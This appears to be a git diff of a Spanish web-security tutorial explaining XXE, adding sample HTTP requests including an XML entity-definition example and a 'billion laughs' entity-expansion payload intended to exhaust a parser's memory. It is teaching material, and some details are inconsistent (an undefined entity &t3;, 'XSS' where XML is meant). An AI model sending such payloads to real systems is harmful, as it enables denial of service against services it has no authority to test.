@@ -984,15 +984,82 @@ Hay varios ataques distintos, voy a explicar tres:
 
 Si una aplicación web `acepta XML como input` y nos `devuelve un output`, una petición se veria algo parecido a esto:
 
+```
 |                Request                |
 |---------------------------------------|
-|```
 | POST http://example.com/xml HTTP/1.1  |
 | <mytype>                              |
 |   Hello and welcome to my website!    |
-| </mytype>```                          |
+| </mytype>                             |
+```
 
+```
+|               Response               |
+|--------------------------------------|
+| HTTP/1.0 200 OK                      |
+|                                      |
+| Hello and welcome to my website!     |
 
+```
+
+Los documentos XSS pueden tener tipos especificos definidos por dos estandares: `-XSD` y `DTD`
+
+Los documentos definidos con `DTD` son `vulnerables` a `XXE`. 
+
+El siguiente ejemplo utiliza una `DTD` llamada `mytype`. Esta `DTD` `define una entidad XML` llamada `name`. Cuando este elemento es `llamado en el output`, el analizador de sintaxis de XML `lee el DTD` y `lo replaca por un valor numérico`. 
+
+```
+|                   Request                   |
+|---------------------------------------------|
+| POST http://example.com/xml HTTP/1.1        |
+|                                             |
+| <?xml version="1.0" encoding="ISO-8859-1"?> |
+| <!DOCTYPE mytype [                          |
+| <!ELEMENT mytype ANY>                       |
+| <!ENTITY name "John">                       |
+| ]>                                          |
+| <mytype>                                    |
+| Hello &name; and welcome to my website!     |
+| </mytype>                                   |
+```
+
+```
+|                  Response                   |
+|---------------------------------------------|
+| HTTP/1.0 200 OK                             |
+|                                             |
+| Hello John and welcome to my website!       |
+```
+
+Ahora vamos a ver como en base a esto podemos hacer el ataque `billion laughs attack` si el analizador de sintaxsis de XML `no limita la cantidad de memoria` que puede utilizar, este ataque es una `técnica recursiva para sobrecargar la memoria` de la web víctima. Asi podemos hacer `denegaciones de servicio` y `buffer overflows`.
+
+```
+|                      Request                      |
+|---------------------------------------------------|
+| POST http://example.com/xml HTTP/1.1              |
+|                                                   |
+| <?xml version="1.0" encoding="ISO-8859-1"?>       |
+| <!DOCTYPE mytype [                                |
+| <!ELEMENT mytype ANY>                             |
+| <!ENTITY name "John ">                            |
+| <!ENTITY name2 "&name;&name;">                    |
+| <!ENTITY name3 "&name2;&name2;&name2;&name2;">    |
+| <!ENTITY name4 "&name3;&name3;&name3;&name3;">]>  |
+| <foo>                                             |
+| Hello &t3;                                        |
+| </foo>                                            |
+```
+
+```
+|                                   Response                                   |
+|------------------------------------------------------------------------------|
+| Response                                                                     |
+| HTTP/1.0 200 OK                                                              |
+|                                                                              |
+| Hello John John John John John John John John John John John John John John  |
+| John John John John John John John John John John John John John John John   |
+| John John John John John John John John John John John John John John        |
+```
 
 ### XXE SSRF Attack
 
